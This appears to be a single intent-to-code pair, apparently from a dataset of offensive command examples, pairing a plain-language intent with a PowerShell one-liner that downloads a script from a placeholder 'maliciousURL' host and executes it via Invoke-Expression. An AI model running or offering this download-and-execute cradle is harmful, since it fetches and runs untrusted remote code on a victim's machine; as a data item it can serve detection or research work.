# Natural language intent:
# Download and execute a script using Invoke-Expression and WebClient.

Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://maliciousURL/maliciousscript.ps1')
